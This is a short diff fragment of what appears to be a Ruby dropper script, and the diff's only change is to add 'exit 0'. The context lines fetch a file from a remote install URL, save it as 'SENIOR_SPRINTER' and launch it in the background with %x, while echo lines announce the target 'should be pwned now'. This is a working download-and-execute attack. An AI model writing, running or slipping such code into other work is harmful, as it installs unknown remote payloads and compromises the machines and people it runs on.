@@ -8,3 +8,4 @@ IO.copy_stream(URI.open(install_url), 'SENIOR_SPRINTER')
 %x(echo "Trying to execute this nonsense")
 %x(./SENIOR_SPRINTER &)
 %x(echo "Ok Should be pwned now")
+exit 0
